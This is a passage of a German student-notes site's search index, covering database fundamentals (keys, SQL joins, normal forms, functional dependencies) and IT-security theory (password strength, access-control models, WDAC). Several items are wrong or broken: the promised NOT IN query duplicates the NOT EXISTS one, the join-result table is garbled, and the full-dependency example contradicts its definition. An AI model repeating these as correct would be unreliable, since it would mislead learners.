Runde verfallen Falschlieferung 5 % Item funktioniert nicht Bonus-Kunde 5 % Einnahme verdoppelt","tags":["Course/"]},{"location":"studium/Datenbanken/Datenbanken-Zusammenfassung/","title":"Datenbanken Zusammenfassung","text":""},{"location":"studium/Datenbanken/Datenbanken-Zusammenfassung/#allgemein","title":"Allgemein","text":"<p>Auf GitHub l\u00e4sst sich ein kleines Projekt von mir finden das ich in der letzten \u00dcbungsaufgabe im Auftrag dieser Lehrveranstaltung gemacht habe</p> <p>Link zum Projekt auf Github</p> <p>Das stellt eine ganz primitive GUI dar mit der man sich einloggen kann und dann eine Liste aller der Datenbank hinzugef\u00fcgten Ferienwohnungen bekommt. Ich sage primitiv weil der Login ganz simple gehalten ist.  Passw\u00f6rter werden nicht gehashed.  Es wird keine Sessions erstellt usw. Es ist simple aber daf\u00fcr gut strukturiert gebaut. Schnell verst\u00e4ndlich und gut erweiterbar wenn man denn Bedarf dazu hat. </p> <ul> <li> <p>Loginbereich f\u00fcr Kunden. Eingabe wird mit Daten aus der Datenbank abgeglichen </p> </li> <li> <p>Bilder URL werden dynamisch aus der DB geladen damit die Verkn\u00fcpfung zwischen Ferienwohnugeintr\u00e4ge und Bildern erhalten bleibt. </p> </li> <li> <p>Einsicht in meine Buchungen wurde integriert und ruft die Buchungen des jeweiligen Kunden aus der Datenbank </p> </li> <li> <p>Buchungen werden erst \u00fcberpr\u00fcft ob es \u00fcberhaupt zu dem Zeitpunkt verf\u00fcgbar ist, falls nicht dann bekommt man daf\u00fcr ebenfalls eine Benachrichtigung </p> </li> <li> <p>Falls verf\u00fcgbar \u00e4ndert sich der Button und man kann die Buchung best\u00e4tigen zu dem Zeitraum </p> </li> </ul>"},{"location":"studium/Datenbanken/Datenbanken-Zusammenfassung/#schlusselubersicht","title":"Schl\u00fcssel\u00fcbersicht","text":"Schl\u00fcsseltyp SQL-Definition Zweck Prim\u00e4rschl\u00fcssel <code>PRIMARY KEY</code> Der eine ausgew\u00e4hlte Kandidatenschl\u00fcssel. Eindeutig + nicht NULL. Kandidatenschl\u00fcssel <code>UNIQUE</code> Jede minimale Attributkombination, die die Zeilen eindeutig identifiziert. (Eindeutige Optionen) Superschl\u00fcssel nicht explizit definiert Jede Attributkombination, die eindeutig ist (auch mit \u00fcberfl\u00fcssigen Spalten). Fremdschl\u00fcssel <code>FOREIGN KEY REFERENCES</code> Verbindung zwischen Tabellen <pre><code>CREATE TABLE Student (\n    matrikelnummer INT PRIMARY KEY,\n    name VARCHAR(100)\n);\nCREATE TABLE Student (\n    matrikelnummer INT PRIMARY KEY,\n    email VARCHAR(100) UNIQUE,\n    name VARCHAR(100)\n);\nCREATE TABLE Anmeldung (\n    student_email VARCHAR(100),\n    kursID INT,\n    FOREIGN KEY (student_email) REFERENCES Student(email)\n);\n</code></pre> Textaussage Hinweis auf Beziehungstyp \u201eFerienwohnungen befinden sich in einem bestimmten Land \u2026\u201c \u201eeine\u201c Land \u2192 viele Wohnungen 1:n (Land \u2192 Ferienwohnung) \u201e\u2026 und haben eine Adresse\u201c \u201eeine\u201c Adresse \u2192 viele Wohnungen 1:n (Adresse \u2192 Wohnung) \u201e\u2026 mehrere Bilder von der Ferienwohnung abgelegt werden\u201c eine Wohnung \u2192 mehrere Bilder 1:n (Wohnung \u2192 Bild) \u201e\u2026 deren Ausstattungen gespeichert werden (z.B. Sauna, \u2026)\u201c viele Wohnungen \u2194 viele Ausstattungen n:m \u201e\u2026 Entfernung zu einigen nahegelegenen Touristenattraktionen \u2026\u201c mehrere Wohnungen \u2194 mehrere Attraktionen n:m \u201eKunden k\u00f6nnen Ferienwohnungen buchen\u201c Kunde \u2194 Ferienwohnung \u00fcber Buchung n:m, mit Beziehungstabelle \u201eBuchung\u201c \u201e\u2026 erhalten Kunden eine Buchungsnummer \u2026\u201c eine Buchung hat genau eine Nummer 1:1 (Buchung \u2192 Buchungsnummer) \u201e\u2026 eine Rechnung mit Rechnungsnummer, Datum, Betrag\u201c eine Buchung \u2192 eine Rechnung 1:1 (Buchung \u2192 Rechnung) \u201e\u2026 in Rechnungen k\u00f6nnen ein oder mehrere Anzahlungen vereinbart werden\u201c eine Rechnung \u2192 mehrere Anzahlungen 1:n \u201e\u2026 Kunden bewerten eine Ferienwohnung\u201c Kunde \u2194 Wohnung durch Bewertung n:m, aber nur nach Buchung erlaubt \u201e\u2026 Mitarbeiter \u2026 sollen Daten pflegen k\u00f6nnen\u201c Zugriff auf alles - eher keine Beziehung, eher Rollenmodell"},{"location":"studium/Datenbanken/Datenbanken-Zusammenfassung/#er-modell-relationenmodell-ubersichtstabelle","title":"ER-Modell \u2192 Relationenmodell - \u00dcbersichtstabelle","text":"ER-Modell-Element Wird im Relationenmodell zu \u2026 Beispiel Entity-Typ Eigene Relation <code>Student = (matrikelnr==, name, geburtsdatum})</code> 1:1-Relationship Entweder: eine Relation f\u00fcr beide Seiten oder Fremdschl\u00fcssel <code>Person(ausweisnr, name, geburtsdatum, g\u00fcltigBis)</code> 1:n-Relationship Fremdschl\u00fcssel auf \u201en\u201c-Seite <code>Mitarbeiter(manr, name, abtnr)</code> \u2190 <code>abtnr</code> ist FK auf <code>Abteilung</code> n:m-Relationship Eigene Relation mit 2 Fremdschl\u00fcsseln <code>Besucht = ({==matrikelnr==, ==vorlID)</code> n-\u00e4re Relationship (n &gt; 2) Eigene Relation mit n Fremdschl\u00fcsseln <code>Liefert = (lnr==, ==tnr==, ==fnr==, menge})</code> Einfaches Attribut Normales Attribut in der Relation <code>preis</code>, <code>name</code>, <code>geburtsdatum</code> Zusammengesetztes Attribut Aufgeteilt in mehrere einfache Attribute <code>adresse(plz, ort, strasse)</code> \u2192 <code>plz</code>, <code>ort</code>, <code>strasse</code> Mehrwertiges Attribut Eigene Relation mit Fremdschl\u00fcssel zur Ursprungstabelle <code>Telefon = ({==matrikelnr==, ==telnr)</code> Schl\u00fcsselattribut Prim\u00e4rschl\u00fcssel (unterstrichen) oder ggf. zus\u00e4tzlicher <code>UNIQUE</code>-Schl\u00fcssel <code>Student = ({==matrikelnr==, name})</code>"},{"location":"studium/Datenbanken/Datenbanken-Zusammenfassung/#bcnf-format","title":"BCNF-Format:","text":"Symbol / Aufbau Bedeutung <code>{A1, A2, ..., An}</code> Attributmenge Unterstrich <code>_Attribut_</code> Prim\u00e4rschl\u00fcssel Zweite <code>{}</code>-Menge Funktionale Abh\u00e4ngigkeiten oder leer n:m-Beziehung Eigene Relation, kombinierter Schl\u00fcssel Mehrwertige Attribute Ausgelagert in eigene Relation Fremdschl\u00fcssel Gestrichelt"},{"location":"studium/Datenbanken/Datenbanken-Zusammenfassung/#1-grundstruktur-von-select-abfragen","title":"1. Grundstruktur von SELECT-Abfragen","text":"<pre><code>SELECT spalten\nFROM tabelle\n[JOIN andere_tabelle ON bedingung]\n[WHERE filter_bedingung]\n[GROUP BY gruppierung]\n[HAVING gruppenbedingung]\n[ORDER BY sortierung [ASC|DESC]];\n</code></pre>"},{"location":"studium/Datenbanken/Datenbanken-Zusammenfassung/#2-wichtige-aggregatsfunktionen","title":"2. Wichtige Aggregatsfunktionen","text":"Funktion Beschreibung Beispiel <code>COUNT(*)</code> Z\u00e4hlt alle Zeilen <code>COUNT(*)</code> <code>COUNT(spalte)</code> Z\u00e4hlt nur NICHT-NULL Werte <code>COUNT(b.Sterne)</code> <code>SUM(spalte)</code> Summiert numerische Spalten <code>SUM(PreisProTag)</code> <code>COUNT(DISTINCT spalte)</code> <code>SELECT COUNT(DISTINCT kundennr) FROM Bestellung</code> Z\u00e4hlt einmal pro Wert (ohne Duplikate) <code>AVG(spalte)</code> Durchschnitt (ign. NULL) <code>AVG(b.Sterne)</code> <code>MIN(spalte)</code> Kleinster Wert <code>MIN(PreisProTag)</code> <code>MAX(spalte)</code> Gr\u00f6\u00dfter Wert <code>MAX(Sterne)</code> <code>DESC</code> / <code>ASC</code> Absteigend / aufsteigend sortieren <code>ORDER BY COUNT(*) DESC</code> <code>DISTINCT</code> Entfernt Duplikate - oft in <code>COUNT(DISTINCT ...)</code> <code>COUNT(DISTINCT marke)</code> <code>LIMIT n</code> Beschr\u00e4nkt auf n Zeilen (nicht in allen Dialekten) <code>LIMIT 1</code> (nur Top 1)"},{"location":"studium/Datenbanken/Datenbanken-Zusammenfassung/#3-joins-tabellen-verknupfen","title":"3. Joins (Tabellen verkn\u00fcpfen)","text":"<pre><code>-- Inner Join (nur passende Zeilen)\nSELECT ...\nFROM A\nJOIN B ON A.id = B.a_id;\n\n-- Left Join (auch Zeilen aus A ohne Treffer in B)\nSELECT ...\nFROM A\nLEFT JOIN B ON A.id = B.a_id;\n</code></pre>"},{"location":"studium/Datenbanken/Datenbanken-Zusammenfassung/#beispiel","title":"Beispiel:","text":"<pre><code>SELECT f.Name, a.Land\nFROM Ferienwohnung f\nJOIN Adresse a ON f.ADRESSE_ID = a.ID;\n</code></pre>"},{"location":"studium/Datenbanken/Datenbanken-Zusammenfassung/#4-group-by-having-gruppieren-filtern","title":"4. GROUP BY + HAVING - Gruppieren &amp; Filtern","text":"<pre><code>-- Durchschnitt pro Wohnung (nur bei Bewertungen &gt; 4)\nSELECT FERIENWOHNUNG_ID, AVG(Sterne)\nFROM Buchung\nGROUP BY FERIENWOHNUNG_ID\nHAVING AVG(Sterne) &gt; 4;\n</code></pre> <ul> <li><code>GROUP BY</code>: gruppiert Zeilen (z.\u202fB. pro Kunde, Wohnung, Land)</li> <li><code>HAVING</code>: filtert Gruppen (wie WHERE, aber nach Gruppierung)</li> </ul>"},{"location":"studium/Datenbanken/Datenbanken-Zusammenfassung/#5-not-in-vs-not-exists-um-nicht-enthaltene-falle-zu-finden","title":"5. <code>NOT IN</code> vs. <code>NOT EXISTS</code> (um \u201enicht enthaltene\u201c F\u00e4lle zu finden)","text":""},{"location":"studium/Datenbanken/Datenbanken-Zusammenfassung/#ferienwohnungen-ohne-buchungen","title":"Ferienwohnungen ohne Buchungen","text":"<pre><code>SELECT *\nFROM Ferienwohnung f\nWHERE NOT EXISTS (\n    SELECT 1 FROM Buchung b WHERE b.FERIENWOHNUNG_ID = f.ID\n);\n</code></pre> <p>Oder auch:</p> <pre><code>SELECT *\nFROM Ferienwohnung f\nWHERE NOT EXISTS (\n    SELECT 1 FROM Buchung b WHERE b.FERIENWOHNUNG_ID = f.ID\n);\n</code></pre>"},{"location":"studium/Datenbanken/Datenbanken-Zusammenfassung/#merke","title":"Merke:","text":"<ul> <li>Verwende <code>WHERE</code> zum Filtern von einzelnen Zeilen</li> <li>Verwende <code>HAVING</code> nur, wenn du <code>GROUP BY</code> verwendest</li> </ul>"},{"location":"studium/Datenbanken/Datenbanken-Zusammenfassung/#uberblick-arten-von-joins","title":"\u00dcberblick: Arten von JOINs","text":"JOIN-Typ Was er macht Gibt Zeilen aus, wenn ... INNER JOIN Nur \u00fcbereinstimmende Zeilen in beiden Tabellen Match vorhanden in beiden Tabellen LEFT OUTER JOIN Alle Zeilen aus der linken Tabelle, plus passende aus rechts Immer alles von links, ggf. NULLs von rechts RIGHT OUTER JOIN Alle Zeilen aus der rechten Tabelle, plus passende aus links Immer alles von rechts, ggf. NULLs von links FULL OUTER JOIN Alle Zeilen aus beiden Tabellen - auch wenn keine \u00dcbereinstimmung Zeigt alle, fehlende Daten als NULL (nicht in MySQL a b c d 77 16 9 77 a b c d 9 4 NULL NULL 15 16 NULL NULL 77 16 9 77 a b c d 77 16 9 77 NULL NULL 4 4 NULL NULL 9 16 a b c d 9 4 NULL NULL 15 16 NULL NULL 77 16 9 77 NULL NULL 4 4 NULL NULL 9 16"},{"location":"studium/Datenbanken/Datenbanken-Zusammenfassung/#normalformen-im-uberblick-mit-beispielen","title":"Normalformen im \u00dcberblick - mit Beispielen","text":"NF Bedingung Verletzung Beispielrelation (Fehler) Ziel / L\u00f6sung 1NF Alle Werte atomar Listen, Mengen <code>Student(matrikelnr, name, {telefon})</code> \u2192 Mehrere Nummern in 1 Zelle <code>Telefon(matrikelnr, telnr)</code> als eigene Relation 2NF Nicht-Schl\u00fcsselattribute sind voll abh\u00e4ngig vom gesamten Prim\u00e4rschl\u00fcssel Partielle Abh\u00e4ngigkeit <code>Belegung(matrikelnr, kursID, name)</code> \u2192 <code>name</code> h\u00e4ngt nur von <code>matrikelnr</code> ab Trennen: <code>Student(matrikelnr, name)</code>, <code>Belegung(matrikelnr, kursID)</code> 3NF Keine transitive Abh\u00e4ngigkeit zwischen Nicht-Schl\u00fcsselattributen Transitive Abh\u00e4ngigkeit <code>Studiengang(stgID, name, fakult\u00e4t)</code> \u2192 <code>name \u2192 fakult\u00e4t</code> Trennen: <code>Studiengang(stgID, name)</code>, <code>Fakult\u00e4t(name, fakult\u00e4t)</code> BCNF F\u00fcr jede FA <code>X \u2192 Y</code> ist <code>X</code> ein Superschl\u00fcssel Nicht-Superschl\u00fcssel bestimmt etwas <code>Kurs(kursID, raum, dozentID)</code> mit <code>dozentID \u2192 raum</code> aber <code>dozentID</code> ist kein Superschl\u00fcssel Zerlegen nach <code>dozentID \u2192 raum</code>: eigene Relation"},{"location":"studium/Datenbanken/Datenbanken-Zusammenfassung/#arten-von-funktionalen-abhangigkeiten","title":"Arten von Funktionalen Abh\u00e4ngigkeiten","text":""},{"location":"studium/Datenbanken/Datenbanken-Zusammenfassung/#typische-keywords-die-fas-andeuten","title":"Typische Keywords, die FAs andeuten:","text":"Ausdruck Bedeutet wahrscheinlich \u201eeindeutig\u201c \u2192 Linksseitiger Determinant einer FA \u201eimmer derselbe\u201c \u2192 Abh\u00e4ngigkeit (funktional!) \u201ehat eine feste ...\u201c \u2192 rechtsseitige Abh\u00e4ngigkeit \u201eeine Note pro ...\u201c \u2192 Mehrattributige Determinante \u201ePrim\u00e4rschl\u00fcssel ist ...\u201c \u2192 Startpunkt f\u00fcr alle FAs Art Beschreibung Beispiel Volle Abh\u00e4ngigkeit <code>X \u2192 Y</code>, aber keine Teilmenge von <code>X</code> bestimmt <code>Y</code> <code>(A, B) \u2192 C</code>, aber <code>A \u2192 C</code> Partielle Abh\u00e4ngigkeit Nur ein Teil eines Schl\u00fcssels bestimmt <code>Y</code> <code>A \u2192 C</code>, wenn Schl\u00fcssel <code>(A, B)</code> Transitive Abh\u00e4ngigkeit <code>X \u2192 Y</code> und <code>Y \u2192 Z</code> \u2192 also <code>X \u2192 Z</code>, aber \u00fcber Umweg <code>matrikelnr \u2192 studiengang \u2192 fakult\u00e4t</code> Triviale Abh\u00e4ngigkeit <code>Y \u2286 X</code> \u2192 immer erf\u00fcllt <code>A, B \u2192 B</code> Mehrwertige Abh\u00e4ngigkeit (MVD) <code>X \u21a0 Y</code>, wenn mehrere Werte f\u00fcr <code>Y</code> unabh\u00e4ngig von anderen Attributen 4NF-Thema <p>FA bestimmen: (Etwas Eindeutiges bestimmt etwas Nicht-Eindeutiges) (Eindeutiges -&gt; Nicht Eindeutig) </p><pre><code>- benotung-ID-&gt; matrikelnummer, vorlesungsnummer, semester, studierendenname,     vorlesungsname, h\u00f6rsaal, anzSitze, note\n- martrikelnummer-&gt;studierendenname\n- vorlesungsnummer-&gt;vorlesungsname\n- (vorlesungsnummer,semester)-&gt;h\u00f6rsaal \n    weil: \n    \"Eine Vorlesung findet innerhalb eines \n    Semesters immer im gleichen H\u00f6rsaal statt.\"\n- h\u00f6rsaal-&gt;anzSitze\n- (martrikelnummer,vorlesungsnummer,semester)-&gt;note\n</code></pre><p></p>"},{"location":"studium/IT-Security/IT-Security%20Theorie%201/","title":"IT Security Theorie 1","text":"","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#user-authentication-passwords","title":"User Authentication: Passwords","text":"<p>Worum geht's? \u2192 Nutzer authentifizieren sich typischerweise mit Passw\u00f6rtern. Damit ein Passwort sicher ist, muss es schwer zu erraten sein.</p> <p>Wichtige Konzepte:</p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#passwortstarke","title":"Passwortst\u00e4rke","text":"<ul> <li> <p>Anzahl m\u00f6glicher Kombinationen bestimmt, wie schwer ein Passwort zu erraten ist.</p> </li> <li> <p>Formel:     $$     \\text{Anzahl der m\u00f6glichen Passw\u00f6rter} = (\\text{Anzahl der m\u00f6glichen Zeichen})^{\\text{L\u00e4nge des Passworts}} $$</p> </li> <li>Beispiel: Nur Kleinbuchstaben (26 Zeichen), Passwortl\u00e4nge = \\(14 \u2192 26^{14}\\)Kombinationen.</li> </ul>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#brute-force-angriff","title":"Brute-Force-Angriff","text":"<ul> <li>Der Angreifer probiert systematisch alle M\u00f6glichkeiten durch.</li> <li>Geschwindigkeit: z.B. 30.000 Versuche pro Sekunde.</li> <li>Rechenweg:<ol> <li>Gesamte Passwortanzahl berechnen.</li> <li>Teilen durch die Rate (Versuche/Sekunde).</li> <li>Umrechnen auf Minuten/Stunden/Tage.</li> </ol> </li> </ul> <p>Merke:</p> <ul> <li>Online-Angriffe sind meistens langsam (wegen Verz\u00f6gerungen).</li> <li>Offline-Angriffe (z.B. gestohlene Passwort-Datenbanken) k\u00f6nnen Milliarden Versuche pro Sekunde machen.</li> </ul>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#beliebte-passworter-und-schwache-nutzer","title":"Beliebte Passw\u00f6rter und \"Schwache\" Nutzer","text":"<ul> <li>Viele Nutzer w\u00e4hlen sehr einfache oder beliebte Passw\u00f6rter (\"123456\", \"password\").</li> <li>90 % der Nutzer nehmen vielleicht eines von 1.000 h\u00e4ufigen Passw\u00f6rtern.</li> <li>Dann wird die Wahrscheinlichkeit f\u00fcr den Angreifer viel besser, weil er zuerst nur die 1.000 Varianten probieren muss.</li> </ul>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#erfolgswahrscheinlichkeit-und-lockout","title":"Erfolgswahrscheinlichkeit und Lockout","text":"<ul> <li>Manche Systeme sperren Accounts, wenn zu viele Fehlversuche auftreten.</li> <li>Typische Schutzma\u00dfnahme: Nach 5 falschen Passw\u00f6rtern \u2192 Account-Sperre.</li> </ul>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#2-access-control","title":"2. Access Control","text":"<p>Worum geht's? \u2192 Systeme m\u00fcssen regeln, wer auf welche Ressourcen zugreifen darf.</p> <p>Wichtige Konzepte:</p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#access-control-models","title":"Access Control Models","text":"<ul> <li>Discretionary Access Control (DAC): Benutzer kann selbst Rechte vergeben (z.B. Windows-Filesharing).</li> <li>Mandatory Access Control (MAC): Strenge Regeln vom System vorgegeben (z.B. Milit\u00e4rische Systeme).</li> <li>Role-Based Access Control (RBAC): Zugriff erfolgt \u00fcber Rollen.</li> </ul>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#access-control-list-acl-vs-capability-list","title":"Access Control List (ACL) vs. Capability List","text":"<ul> <li> <p>ACL:     Objekt-zentriert. Jedes Objekt hat eine Liste, die beschreibt, wer es benutzen darf.     Beispiel: Datei \u201eGeheim.pdf\u201c \u2192</p> <ul> <li>Max: Lesen</li> <li>Anna: Lesen + Schreiben</li> </ul> </li> <li> <p>Capability List:     Subjekt-zentriert. Jeder Benutzer hat eine Liste, welche Objekte er benutzen darf.     Beispiel: Benutzer Max \u2192</p> <ul> <li>Lesen: Geheim.pdf</li> <li>Schreiben: Hausarbeit.docx Apps auf dem Smartphone:</li> </ul> </li> <li>Apps fragen Berechtigungen (Kamera, Mikrofon, Standort).</li> <li>Diese Berechtigungen sind in Android/iOS meist Capability-basiert.</li> </ul> Kategorie Access Control List (ACL) Capability List Objektzentriert Das Objekt (z.B. Datei, Kamera) hat eine Liste, wer es nutzen darf. Subjektzentriert Das Subjekt (App oder Benutzer) hat eine Liste, was es nutzen darf.","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#rolle-basierte-zugriffskontrolle-rbac","title":"Rolle-basierte Zugriffskontrolle (RBAC)","text":"<ul> <li>Nutzer bekommen Rollen zugewiesen.</li> <li>Rollen besitzen bestimmte Berechtigungen.</li> <li>Beispiel Moodle:<ul> <li>Student \u2192 Aufgaben abgeben, Materialien lesen.</li> <li>Dozent \u2192 Aufgaben hochladen, Abgaben bewerten.</li> <li>Admin \u2192 Einstellungen \u00e4ndern.</li> </ul> </li> </ul> <p>Vorteil:</p> <ul> <li>Einfacher, Benutzer zu verwalten \u2192 \u00c4nderungen nur an der Rolle n\u00f6tig, nicht an jedem einzelnen Benutzer.</li> </ul>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#trennung-von-benutzer-und-admin-accounts","title":"Trennung von Benutzer- und Admin-Accounts","text":"<ul> <li>Warum zwei Accounts haben?<ul> <li>Risiko minimieren: Weniger Rechte = weniger Schaden bei Angriffen.</li> <li>Tippfehler oder versehentliche Aktionen passieren im Alltag.</li> <li>Malware kann sich schwerer mit Adminrechten verbreiten.</li> </ul> </li> </ul> <p>Fazit: \u2192 Keine unn\u00f6tige B\u00fcrokratie, sondern sinnvolle Risikominimierung!</p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#discretionary-access-control-dac","title":"Discretionary Access Control (DAC)","text":"<p>Kernidee:</p> <ul> <li>Der Besitzer eines Objekts (z.B. einer Datei) darf selbst entscheiden, wer darauf Zugriff bekommt.</li> <li>\"Discretionary\" hei\u00dft \u00fcbersetzt etwa \u201enach eigenem Ermessen\u201c.</li> <li>Flexible, benutzerfreundliche Kontrolle: Du selbst kannst anderen Leuten Rechte auf deine Sachen geben.</li> </ul> <p>Beispiel:</p> <ul> <li>Du hast auf deinem Windows-PC ein Word-Dokument.</li> <li> <p>Du kannst selbst festlegen:</p> <ul> <li>Max darf es lesen.</li> <li>Lisa darf es lesen und bearbeiten.</li> <li>Anna darf gar nichts sehen.</li> </ul> </li> </ul> <p>Typische Systeme mit DAC:</p> <ul> <li>Windows NTFS-Dateisystem (\u00fcber Datei-Eigenschaften \u2192 Sicherheit)</li> <li>Unix/Linux (Berechtigungen: lesen/schreiben/ausf\u00fchren)</li> </ul> <p>Vorteile:</p> <ul> <li>Sehr flexibel und benutzerfreundlich.</li> <li>Benutzer k\u00f6nnen eigene Ressourcen eigenst\u00e4ndig verwalten.</li> </ul> <p>Nachteile:</p> <ul> <li>Sicherheitsrisiko: Benutzer k\u00f6nnen versehentlich falsche Berechtigungen vergeben.</li> <li>Malware k\u00f6nnte Rechte \u00fcbernehmen, wenn ein Benutzer unvorsichtig ist.</li> </ul>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#mandatory-access-control-mac","title":"Mandatory Access Control (MAC)","text":"<p>Kernidee:</p> <ul> <li>Das System kontrolliert zentral, wer Zugriff auf was hat \u2014 nicht der einzelne Benutzer!</li> <li>Regeln sind festgelegt und nicht ver\u00e4nderbar durch Benutzer.</li> <li>H\u00e4ufig genutzt in Hochsicherheitsumgebungen (Milit\u00e4r, Regierung).</li> </ul> <p>Beispiel:</p> <ul> <li> <p>Dateien werden mit einer \u201eGeheimhaltungsstufe\u201c versehen: \"Geheim\", \"Streng Geheim\", \"\u00d6ffentlich\".</p> </li> <li> <p>Benutzer bekommen ebenfalls eine Klassifizierung:</p> <ul> <li>Anna \u2192 darf \"Streng Geheim\" lesen</li> <li>Max \u2192 darf nur \"Geheim\" lesen</li> </ul> </li> <li> <p>Das System entscheidet automatisch, ob Anna oder Max auf eine Datei zugreifen darf, basierend auf diesen Stufen.</p> </li> <li>Benutzer k\u00f6nnen die Berechtigungen NICHT \u00e4ndern, auch wenn sie Besitzer der Datei sind.</li> </ul> <p>Typische Systeme mit MAC:</p> <ul> <li>SELinux (Security-Enhanced Linux)</li> <li>Windows mit Active Directory Richtlinien (teilweise)</li> </ul> <p>Vorteile:</p> <ul> <li>Hohe Sicherheit, weil Benutzer keine Fehler machen k\u00f6nnen.</li> <li>Strikte Trennung von Informationen.</li> </ul> <p>Nachteile:</p> <ul> <li>Unflexibel: Benutzer k\u00f6nnen nicht schnell Rechte \u00e4ndern.</li> <li>Komplex in der Verwaltung.</li> </ul> <p></p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#3-application-whitelisting-wdac","title":"3. Application Whitelisting (WDAC)","text":"","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#wdac-windows-defender-application-control","title":"WDAC (Windows Defender Application Control)","text":"","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#grundidee","title":"Grundidee:","text":"<p>Nur genehmigte Software darf laufen \u2192 Alles andere wird blockiert - auch Schadsoftware, unbekannte Programme oder manipulierte Dateien. Anders als Antivirenprogramme, die b\u00f6se Software erkennen wollen, verhindert Whitelisting von vornherein, dass \u00fcberhaupt irgendetwas Unerlaubtes startet.</p> <ul> <li>Whitelisting: Standardm\u00e4\u00dfig alles blockieren, was nicht explizit erlaubt ist.</li> </ul>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#arten-von-wdac-regeln","title":"Arten von WDAC-Regeln","text":"<p>WDAC kann verschiedene Kriterien verwenden, um zu entscheiden, was erlaubt ist:</p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#1-dateipfad-regeln","title":"1. Dateipfad-Regeln","text":"<ul> <li>Programme, die an bestimmten Orten gespeichert sind, sind erlaubt.</li> <li>Beispiel: Nur Programme im Ordner C:\\Program Files oder C:\\Windows d\u00fcrfen laufen.</li> <li>Problem: Angreifer k\u00f6nnten Dateien in erlaubte Ordner kopieren \u2192 daher nicht allein sicher.</li> </ul>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#2-datei-hash-regeln","title":"2. Datei-Hash-Regeln","text":"<ul> <li>Ein Hashwert (ein digitaler Fingerabdruck) wird von der Datei erstellt.</li> <li>Nur Dateien mit einem ganz bestimmten Hash d\u00fcrfen ausgef\u00fchrt werden.</li> <li>Sehr sicher, aber:<ul> <li>Wenn ein Update kommt (z.B. neue Version eines Programms), \u00e4ndert sich der Hash \u2192 neue Hashes m\u00fcssen eingepflegt werden.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#3-signatur-zertifikatsregeln","title":"3. Signatur-/Zertifikatsregeln","text":"<ul> <li>Nur Programme, die von einem vertrauensw\u00fcrdigen Herausgeber digital signiert wurden, sind erlaubt.</li> <li>Beispiel:<ul> <li>Microsoft signiert Windows-Updates.</li> <li>Adobe signiert Acrobat Reader.</li> </ul> </li> <li>Sehr praktisch, weil Programme aktualisiert werden k\u00f6nnen, ohne dass sich Regeln st\u00e4ndig \u00e4ndern m\u00fcssen.</li> </ul>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#4-intelligent-security-graph-regeln-optional","title":"4. Intelligent Security Graph Regeln (optional)","text":"<ul> <li>WDAC kann zus\u00e4tzlich Online-Sicherheitsdatenbanken abfragen (\"Microsoft Intelligent Security Graph\") und Entscheidungen basierend auf Cloud-Intelligenz treffen.</li> </ul>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#wdac-einschrankungen","title":"WDAC Einschr\u00e4nkungen","text":"","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#code-ausfuhrung-ist-eingeschrankt","title":"Code-Ausf\u00fchrung ist eingeschr\u00e4nkt","text":"<ul> <li>Nur erlaubte Programme (laut Whitelist) d\u00fcrfen neu gestartet oder geladen werden.</li> <li>Bedeutet:<ul> <li>Neue Software ohne Erlaubnis? \u2192 Wird blockiert.</li> <li>Virus, der versucht, ein neues Programm zu starten? \u2192 Keine Chance.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#dateizugriffe-lesenschreiben-sind-nicht-eingeschrankt","title":"Dateizugriffe (Lesen/Schreiben) sind NICHT eingeschr\u00e4nkt","text":"<ul> <li>WDAC k\u00fcmmert sich nicht darum, ob Dateien gelesen oder beschrieben werden.</li> <li>Beispiel:<ul> <li>Ein Texteditor, der erlaubt ist, kann beliebige Dateien lesen oder speichern.</li> <li>Solange das Schreib-/Lesezugriffsrecht vom Betriebssystem (z.B. NTFS) erlaubt wird. Fazit:</li> </ul> </li> <li>WDAC sch\u00fctzt vor Ausf\u00fchrung von Schadcode,</li> <li>aber nicht vor Datenlecks, wenn ein erlaubtes Programm missbraucht wird.</li> </ul>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#audit-mode","title":"Audit Mode","text":"<p>Was ist das? - Der Audit Mode erlaubt, WDAC-Regeln nur zu simulieren:     - Programme, die verboten w\u00e4ren, d\u00fcrfen trotzdem laufen.     - ABER: Verst\u00f6\u00dfe werden geloggt und angezeigt.</p> <p>Wof\u00fcr n\u00fctzlich? - Testen neuer Regeln, ohne das Risiko, das wichtige Software pl\u00f6tzlich blockiert wird. - Fehleranalyse: Was w\u00e4re geblockt worden? - Vorbereitung auf sp\u00e4teren \"harten\" Einsatz.</p> <p>Typischer Ablauf: 1. Regeln erstellen. 2. WDAC im Audit Mode aktivieren. 3. Protokolle auswerten. 4. Regeln verbessern. 5. Erst dann: WDAC Enforcement Mode aktivieren (harte Blockierung).</p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security%20Theorie%201/#debugging-und-logs","title":"Debugging und Logs","text":"<ul> <li>WDAC Ereignisse werden im Windows-Event-Log gespeichert:<ul> <li>\u201eMicrosoft-Windows-CodeIntegrity/Operational\u201c</li> </ul> </li> <li>Fehler und 